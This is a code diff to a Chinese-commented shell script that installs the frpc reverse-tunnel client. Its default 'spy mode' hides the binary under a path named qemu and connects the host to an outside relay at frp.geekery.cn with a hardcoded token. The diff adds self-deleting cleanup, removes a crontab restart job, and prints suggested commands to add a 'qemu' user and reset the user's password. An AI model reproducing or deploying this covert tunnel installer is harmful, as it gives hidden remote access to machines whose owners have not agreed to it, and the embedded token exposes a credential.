@@ -15,7 +15,7 @@ Font="\033[0m"
 WORK_PATH=$(dirname $(readlink -f $0))
 FRP_NAME=frpc
 PROXY_URL="https://github.geekery.cn/"
-FRP_VERSION=0.58.0
+FRP_VERSION=0.58.1
 
 # 间谍模式
 FRP_PATH=/usr/local/src/qemu
@@ -28,6 +28,10 @@ if [ "${SPY_MODE:-True}" = "False" ]; then
   FRP_PATH=/usr/local/frp
 fi
 
+
+# Frp Server
+FRP_SERVER_ADDRESS=${FRPS_ADDRESS:-frp.geekery.cn}
+FRP_SERVER_PORT=${FRPS_PORT:-7000}
 
 # check frpc
 if [ -f "${FRP_PATH}/${TARGET_FRP_NAME}" ] || [ -f "${FRP_PATH}/${TARGET_FRP_NAME}.ini" ] || [ -f "/lib/systemd/system/${TARGET_FRP_NAME}.service" ];then
@@ -168,11 +172,10 @@ mkdir -p ${FRP_PATH}
 mv ${FILE_NAME}/${FRP_NAME} ${FRP_PATH}/${TARGET_FRP_NAME}
 
 # configure frpc.ini
-# frp.geekery.cn -> 124.220.42.103
 cat >${FRP_PATH}/${TARGET_FRP_NAME}.ini <<EOF
 [common]
-server_addr = frp.geekery.cn
-server_port = 7000
+server_addr = ${FRP_SERVER_ADDRESS}
+server_port = ${FRP_SERVER_PORT}
 token = hxSoC6lWW6lTR8O64Xqy0tl6BcSYK5Zx5I3BjaO
 login_fail_exit = false
 
@@ -215,17 +218,17 @@ fi
 
 
 # clean
-rm -rf ${WORK_PATH}/${FILE_NAME}.tar.gz #${WORK_PATH}/${FILE_NAME} ${FRP_NAME}_linux_install.sh
+rm -rf ${WORK_PATH}/${FILE_NAME}.tar.gz ${WORK_PATH}/${FILE_NAME} ${FRP_NAME}_linux_install.sh
 
-# add crontab job
 
-if command -v crontab >/dev/null 2>&1; then
-    (crontab -l ; echo "*/5 * * * * if ! pgrep -x '${TARGET_FRP_NAME}' > /dev/null; then systemctl restart ${TARGET_FRP_NAME}; fi") | crontab -
+echo -e "${Green}====================================================================${Font}"
+echo -e "${Green}安装成功,请先修改 ${TARGET_FRP_NAME}.ini 文件,确保格式及配置正确无误!${Font}"
+echo -e "${Red}vi ${FRP_PATH}/${TARGET_FRP_NAME}.ini${Font}"
+echo -e "${Green}修改完毕后执行以下命令重启服务:${Font}"
+echo -e "${Red}systemctl restart ${TARGET_FRP_NAME}${Font}"
+if [ "${SPY_MODE}" = "True" ]; then
+    echo -e "${Green}有用的命令:${Font}"
+    echo -e "${Red}useradd qemu${Font}"
+    echo -e "${Red}printf gG${RANDOM_0}${RANDOM_0}\ngG${RANDOM_0}${RANDOM_0}\n | passwd $USER${Font}"
 fi
-
-# echo -e "${Green}====================================================================${Font}"
-# echo -e "${Green}安装成功,请先修改 ${TARGET_FRP_NAME}.ini 文件,确保格式及配置正确无误!${Font}"
-# echo -e "${Red}vi ${FRP_PATH}/${TARGET_FRP_NAME}.ini${Font}"
-# echo -e "${Green}修改完毕后执行以下命令重启服务:${Font}"
-# echo -e "${Red}systemctl restart ${TARGET_FRP_NAME}${Font}"
-# echo -e "${Green}====================================================================${Font}"
+echo -e "${Green}====================================================================${Font}"
